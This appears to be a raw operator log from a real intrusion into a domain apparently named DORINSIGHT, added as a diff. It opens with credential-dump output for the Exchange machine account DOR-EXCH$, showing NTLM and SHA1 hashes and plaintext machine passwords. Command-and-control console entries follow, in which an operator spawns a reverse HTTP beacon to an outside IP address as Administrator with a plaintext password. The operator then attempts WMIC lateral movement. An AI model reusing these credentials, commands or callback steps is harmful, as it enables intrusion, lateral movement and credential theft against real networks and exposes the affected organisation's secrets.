+Authentication Id : 0 ; 2929652226 (00000000:ae9ef202)
+Session           : Interactive from 2
+User Name         : UMFD-2
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 11/21/2023 9:44:06 PM
+SID               : S-1-5-96-0-2
+	msv :	
+	 [00000003] Primary
+	 * Username : DOR-EXCH$
+	 * Domain   : DORINSIGHT
+	 * NTLM     : 163ebfb7d3a42d8c60e8ce9deb8aac97
+	 * SHA1     : daefb55c573ddd27113f0571e55996da9ed57662
+	 * DPAPI    : daefb55c573ddd27113f0571e55996da
+	tspkg :	
+	wdigest :	
+	 * Username : DOR-EXCH$
+	 * Domain   : DORINSIGHT
+	 * Password : 1e 3a ff 8c b7 79 ab 84 ba 8a 9c d0 d0 7f f5 f4 af 06 94 20 fe f0 aa 75 ab 75 d9 c9 90 6b ca 4c 28 97 75 aa 4a 1e 92 a9 12 8c 16 82 e6 40 0f d9 15 f1 28 df 5d 22 15 6f 1b 25 70 84 e0 a8 7c c3 52 f9 ed 95 4b 49 ba c3 63 c8 c3 11 a5 8e 9e 87 04 97 2f c2 8f 51 94 bd d6 16 ab 35 ee 3d 32 77 bb 65 7f 70 58 56 3c ad 2a 05 c2 d9 f7 69 b4 45 5d 5b 76 cb 4a c3 e9 18 5a 37 b1 b3 20 93 a7 e2 2d 49 71 41 a7 46 ea 55 f8 a2 54 76 98 77 bd 43 8a 03 64 04 b6 10 33 80 5a 1e 11 4f fe a4 d4 24 1f 6b 09 de 9f 14 3e 7d 2c 24 a2 89 f3 73 f0 dc cf 6a c5 b6 2c 7e 10 fb 09 88 5e 31 ae a8 d5 aa 8b 12 4d ea cb e0 a9 69 57 10 7d e9 0d c0 b8 4d e9 ed 64 17 a4 e5 62 b5 f8 45 f8 0e 25 bf 6c c9 1b a7 2b cd fe 9c 5a e2 7e a4 ae b9 dd 5a 9b 27 
+	kerberos :	
+	 * Username : DOR-EXCH$
+	 * Domain   : dorinsight.local
+	 * Password : 1e 3a ff 8c b7 79 ab 84 ba 8a 9c d0 d0 7f f5 f4 af 06 94 20 fe f0 aa 75 ab 75 d9 c9 90 6b ca 4c 28 97 75 aa 4a 1e 92 a9 12 8c 16 82 e6 40 0f d9 15 f1 28 df 5d 22 15 6f 1b 25 70 84 e0 a8 7c c3 52 f9 ed 95 4b 49 ba c3 63 c8 c3 11 a5 8e 9e 87 04 97 2f c2 8f 51 94 bd d6 16 ab 35 ee 3d 32 77 bb 65 7f 70 58 56 3c ad 2a 05 c2 d9 f7 69 b4 45 5d 5b 76 cb 4a c3 e9 18 5a 37 b1 b3 20 93 a7 e2 2d 49 71 41 a7 46 ea 55 f8 a2 54 76 98 77 bd 43 8a 03 64 04 b6 10 33 80 5a 1e 11 4f fe a4 d4 24 1f 6b 09 de 9f 14 3e 7d 2c 24 a2 89 f3 73 f0 dc cf 6a c5 b6 2c 7e 10 fb 09 88 5e 31 ae a8 d5 aa 8b 12 4d ea cb e0 a9 69 57 10 7d e9 0d c0 b8 4d e9 ed 64 17 a4 e5 62 b5 f8 45 f8 0e 25 bf 6c c9 1b a7 2b cd fe 9c 5a e2 7e a4 ae b9 dd 5a 9b 27 
+	ssp :	
+	credman :	
+	cloudap :	
+
+Authentication Id : 0 ; 68074 (00000000:000109ea)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 10/3/2023 3:29:05 PM
+SID               : S-1-5-90-0-1
+	msv :	
+	 [00000003] Primary
+	 * Username : DOR-EXCH$
+	 * Domain   : DORINSIGHT
+	 * NTLM     : 163ebfb7d3a42d8c60e8ce9deb8aac97
+	 * SHA1     : daefb55c573ddd27113f0571e55996da9ed57662
+	 * DPAPI    : daefb55c573ddd27113f0571e55996da
+	tspkg :	
+	wdigest :	
+	 * Username : DOR-EXCH$
+	 * Domain   : DORINSIGHT
+	 * Password : 1e 3a ff 8c b7 79 ab 84 ba 8a 9c d0 d0 7f f5 f4 af 06 94 20 fe f0 aa 75 ab 75 d9 c9 90 6b ca 4c 28 97 75 aa 4a 1e 92 a9 12 8c 16 82 e6 40 0f d9 15 f1 28 df 5d 22 15 6f 1b 25 70 84 e0 a8 7c c3 52 f9 ed 95 4b 49 ba c3 63 c8 c3 11 a5 8e 9e 87 04 97 2f c2 8f 51 94 bd d6 16 ab 35 ee 3d 32 77 bb 65 7f 70 58 56 3c ad 2a 05 c2 d9 f7 69 b4 45 5d 5b 76 cb 4a c3 e9 18 5a 37 b1 b3 20 93 a7 e2 2d 49 71 41 a7 46 ea 55 f8 a2 54 76 98 77 bd 43 8a 03 64 04 b6 10 33 80 5a 1e 11 4f fe a4 d4 24 1f 6b 09 de 9f 14 3e 7d 2c 24 a2 89 f3 73 f0 dc cf 6a c5 b6 2c 7e 10 fb 09 88 5e 31 ae a8 d5 aa 8b 12 4d ea cb e0 a9 69 57 10 7d e9 0d c0 b8 4d e9 ed 64 17 a4 e5 62 b5 f8 45 f8 0e 25 bf 6c c9 1b a7 2b cd fe 9c 5a e2 7e a4 ae b9 dd 5a 9b 27 
+	kerberos :	
+	 * Username : DOR-EXCH$
+	 * Domain   : dorinsight.local
+	 * Password : 1e 3a ff 8c b7 79 ab 84 ba 8a 9c d0 d0 7f f5 f4 af 06 94 20 fe f0 aa 75 ab 75 d9 c9 90 6b ca 4c 28 97 75 aa 4a 1e 92 a9 12 8c 16 82 e6 40 0f d9 15 f1 28 df 5d 22 15 6f 1b 25 70 84 e0 a8 7c c3 52 f9 ed 95 4b 49 ba c3 63 c8 c3 11 a5 8e 9e 87 04 97 2f c2 8f 51 94 bd d6 16 ab 35 ee 3d 32 77 bb 65 7f 70 58 56 3c ad 2a 05 c2 d9 f7 69 b4 45 5d 5b 76 cb 4a c3 e9 18 5a 37 b1 b3 20 93 a7 e2 2d 49 71 41 a7 46 ea 55 f8 a2 54 76 98 77 bd 43 8a 03 64 04 b6 10 33 80 5a 1e 11 4f fe a4 d4 24 1f 6b 09 de 9f 14 3e 7d 2c 24 a2 89 f3 73 f0 dc cf 6a c5 b6 2c 7e 10 fb 09 88 5e 31 ae a8 d5 aa 8b 12 4d ea cb e0 a9 69 57 10 7d e9 0d c0 b8 4d e9 ed 64 17 a4 e5 62 b5 f8 45 f8 0e 25 bf 6c c9 1b a7 2b cd fe 9c 5a e2 7e a4 ae b9 dd 5a 9b 27 
+	ssp :	
+	credman :	
+	cloudap :	
+
+
+11/21 20:54:35 UTC [input] <neo> desktop
+11/21 20:54:37 UTC [task] <> Tasked beacon to spawn VNC server
+11/21 20:55:22 UTC [checkin] host called home, sent: 26 bytes
+11/21 20:55:23 UTC [error] could not allocate 0 bytes in process: 87 - ERROR_INVALID_PARAMETER
+11/21 20:55:23 UTC [output]
+started port forward on 6625 to 127.0.0.1:6625
+
+11/21 21:01:23 UTC [input] <neo> spawnas DOR-EXCH\Administrator Password!321 default_listener
+11/21 21:01:29 UTC [task] <T1078, T1093, T1106> Tasked beacon to spawn windows/beacon_http/reverse_http (91.92.251.25:8888) as DOR-EXCH\Administrator
+11/21 21:01:29 UTC [checkin] host called home, sent: 247861 bytes
+11/21 21:01:59 UTC [input] <neo> shell arp -a
+11/21 21:01:59 UTC [task] <T1059> Tasked beacon to run: arp -a
+11/21 21:02:00 UTC [checkin] host called home, sent: 37 bytes
+11/21 21:02:00 UTC [output]
+received output:
+
+Interface: 10.21.0.122 --- 0xe
+  Internet Address      Physical Address      Type
+  10.21.0.10            00-09-0f-09-00-05     dynamic   
+  10.21.0.255           ff-ff-ff-ff-ff-ff     static    
+  224.0.0.22            01-00-5e-00-00-16     static    
+  224.0.0.251           01-00-5e-00-00-fb     static    
+  224.0.0.252           01-00-5e-00-00-fc     static    
+  239.255.102.18        01-00-5e-7f-66-12     static    
+  239.255.255.250       01-00-5e-7f-ff-fa     static    
+
+
+11/21 21:02:46 UTC [input] <neo> shell wmic /node:224.0.0.22 /password:Password!321 os get name
+11/21 21:02:46 UTC [task] <T1059> Tasked beacon to run: wmic /node:224.0.0.22 /password:Password!321 os get name
+11/21 21:02:46 UTC [checkin] host called home, sent: 87 bytes
+11/21 21:02:46 UTC [output]
+received output:
+Password ignored for null user.
+
+
+11/21 21:03:25 UTC [input] <neo> shell wmic /node:224.0.0.22 /username:Administrator /password:Password!321 os get name
+11/21 21:03:26 UTC [task] <T1059> Tasked beacon to run: wmic /node:224.0.0.22 /username:Administrator /password:Password!321 os get name
+11/21 21:03:26 UTC [checkin] host called home, sent: 111 bytes
+11/21 21:03:26 UTC [output]
+received output:
+Invalid Global Switch.
+
+
+11/21 21:03:47 UTC [input] <neo> wmic /node:224.0.0.22 /user:Administrator /password:Password!321 os get name
+11/21 21:03:48 UTC [error] Unknown command: wmic /node:224.0.0.22 /user:Administrator /password:Password!321 os get name
+11/21 21:03:56 UTC [input] <neo> shell wmic /node:224.0.0.22 /user:Administrator /password:Password!321 os get name
+11/21 21:03:56 UTC [task] <T1059> Tasked beacon to run: wmic /node:224.0.0.22 /user:Administrator /password:Password!321 os get name
+11/21 21:03:56 UTC [checkin] host called home, sent: 107 bytes
+11/21 21:04:01 UTC [output]
+received output:
+Node - 224.0.0.22
+ERROR:
+Description = The RPC server is unavailable.
+
+
+
+
+11/21 21:04:39 UTC [input] <neo> shell wmic /node:239.255.102.18 /user:Administrator /password:Password!321 os get name
+11/21 21:04:39 UTC [task] <T1059> Tasked beacon to run: wmic /node:239.255.102.18 /user:Administrator /password:Password!321 os get name
+11/21 21:04:39 UTC [checkin] host called home, sent: 111 bytes
+11/21 21:04:40 UTC [output]
+received output:
+Node - 239.255.102.18
+ERROR:
+Description = The RPC server is unavailable.
+
+
+
+
+11/21 21:05:21 UTC [input] <neo> shell wmic /node:224.0.0.252 /user:Administrator /password:Password!321 os get name
+11/21 21:05:21 UTC [task] <T1059> Tasked beacon to run: wmic /node:224.0.0.252 /user:Administrator /password:Password!321 os get name
+11/21 21:05:21 UTC [checkin] host called home, sent: 108 bytes
+11/21 21:05:22 UTC [output]
+received output:
+Node - 224.0.0.252
+ERROR:
+Description = The RPC server is unavailable.
+
+
+
+
